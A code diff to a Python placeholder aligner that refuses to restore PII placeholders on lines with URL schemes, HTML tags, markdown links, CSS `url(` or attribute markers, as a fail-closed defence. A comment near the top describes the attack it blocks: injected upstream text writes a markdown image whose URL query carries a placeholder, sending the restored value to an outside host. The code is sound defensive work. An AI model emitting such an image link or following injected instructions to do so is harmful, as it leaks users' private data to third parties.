@@ -283,42 +283,58 @@ class PlaceholderAligner:
         return held
 
 
-# r1 MAJOR-3 and r2 MAJOR-r2-1 (KARARLAR "C17 geri çevirme bağlam istisnası" and "C17 URL bağlam
-# kuralı satır düzeyinde ve fail-closed"): an upstream (external agent, provider, injected
-# instruction) could write `![x](https://its-host/?q=<<PII_1>>)`, and a client that loads images
-# would send the value to that host. The rule is per line, not per URL, so a respelling
-# (`]( //host`, a reference definition, an angle target, an HTML attribute) does not get through:
-# no placeholder on a line that carries one of these markers is reversed.
+# r1 MAJOR-3, r2 MAJOR-r2-1 and r3 MAJOR-r3-1 (KARARLAR "C17 geri çevirme bağlam istisnası", "C17
+# URL bağlam kuralı satır düzeyinde ve fail-closed" and its addendum): an upstream (external
+# agent, provider, injected instruction) could write `![x](https://its-host/?q=<<PII_1>>)`, and a
+# client that loads images would send the value to that host. The rule is per line and by class,
+# not per URL spelling: no placeholder is reversed on a line with an HTML tag (`<` and a letter;
+# a placeholder is not one), a URL scheme with its colon, or a markdown/CSS/attribute marker.
+_HTML_TAG = r"<(?!PII_\d)[a-z]"
+_ATTRS = r"(?:src|href|srcset|action|poster|background|style|data)"
 _URL_MARKER = re.compile(
-    r"\]\(|\]:|//|\b(?:src|href|srcset|action|poster|background)\s*=", re.IGNORECASE
+    r"\]\(|\]:|//|url\(|"
+    + _HTML_TAG
+    + r"|\b(?:https?|ftp|data|javascript|blob|file):|\b"
+    + _ATTRS
+    + r"\s*=",
+    re.IGNORECASE,
 )
-# What opens a target that may go on past the end of its line (a quoted attribute value, a
-# markdown destination, `]:` or `=` with the value on the next line): the next line is under the
-# rule too, until the target closes.
+# What opens a target that may go on past the end of its line (an HTML tag, a quoted attribute
+# value, a markdown destination or CSS `url(`, `]:` or `=` with the value on the next line): the
+# next line is under the rule too, until the target closes. An attribute name that ends a line
+# carries "a value is due".
 _URL_OPENER = re.compile(
-    r"\]\(<|\]\(|\]:|\b(?:src|href|srcset|action|poster|background)\s*=", re.IGNORECASE
+    r"\]\(<|\]\(|url\(|\]:|" + _HTML_TAG + r"|\b" + _ATTRS + r"\s*=", re.IGNORECASE
 )
+_ATTR_NAME_END = re.compile(r"\b" + _ATTRS + r"\s*\Z", re.IGNORECASE)
 _LINE_BREAK = re.compile(r"\r\n|\r|\n")
 _PARENS = re.compile(r"[()]")
+_TAG_STOP = re.compile(r"[>\"']")
 _TARGET_OPEN = {'"': "dq", "'": "sq", "<": "angle"}
-_TARGET_CLOSE = {"dq": '"', "sq": "'", "angle": ">"}
+# mode -> (what closes it, the mode after it)
+_TARGET_CLOSE = {
+    "dq": ('"', None),
+    "sq": ("'", None),
+    "angle": (">", None),
+    "tag_dq": ('"', "tag"),
+    "tag_sq": ("'", "tag"),
+}
 # How much of a stream's current line is kept to see a marker split over chunks; a line longer
 # than this lost its start and its placeholders are kept (fail-closed).
 URL_CONTEXT_MAX_CHARS = 8192
 # How much of the text before a piece the scan looks at again, so a marker split over pieces is
 # seen; longer than every marker (spaces between an attribute name and `=` are `_gap`).
 _MARKER_OVERLAP = 32
-_ATTR_NAME_END = re.compile(r"\b(?:src|href|srcset|action|poster|background)\s*\Z", re.IGNORECASE)
 
 
 def _open_target(line: str, mode: str | int | None) -> str | int | None:
     """The target still open at the end of `line`, given the one open at its start: None, a
-    markdown destination's paren depth, "expect" (a value is due) or the quote/angle that
-    closes it."""
+    markdown destination's or CSS `url(`'s paren depth, "expect" (a value is due), "tag" (inside
+    an HTML tag) or the quote/angle that closes it."""
     i = 0
     while i < len(line):
         if mode == "expect":
-            while i < len(line) and line[i] in " \t":
+            while i < len(line) and line[i] in " \t=":
                 i += 1
             if i == len(line):
                 return mode
@@ -327,9 +343,22 @@ def _open_target(line: str, mode: str | int | None) -> str | int | None:
         elif mode is None:
             opener = _URL_OPENER.search(line, i)
             if opener is None:
-                return None
-            i, token = opener.end(), opener.group(0)
-            mode = "angle" if token == "](<" else 1 if token == "](" else "expect"
+                break
+            i, token = opener.end(), opener.group(0).lower()
+            if token == "](<":
+                mode = "angle"
+            elif token in ("](", "url("):
+                mode = 1
+            elif token.startswith("<"):
+                mode = "tag"
+            else:
+                mode = "expect"
+        elif mode == "tag":
+            stop = _TAG_STOP.search(line, i)
+            if stop is None:
+                return mode
+            i = stop.end()
+            mode = {">": None, '"': "tag_dq", "'": "tag_sq"}[stop.group(0)]
         elif isinstance(mode, int):
             paren = _PARENS.search(line, i)
             if paren is None:
@@ -337,10 +366,13 @@ def _open_target(line: str, mode: str | int | None) -> str | int | None:
             i = paren.end()
             mode = mode + 1 if paren.group(0) == "(" else (mode - 1 or None)
         else:
-            j = line.find(_TARGET_CLOSE[mode], i)
+            closer, after = _TARGET_CLOSE[mode]
+            j = line.find(closer, i)
             if j < 0:
                 return mode
-            mode, i = None, j + 1
+            mode, i = after, j + 1
+    if mode is None and _ATTR_NAME_END.search(line):
+        return "expect"
     return mode
 
 
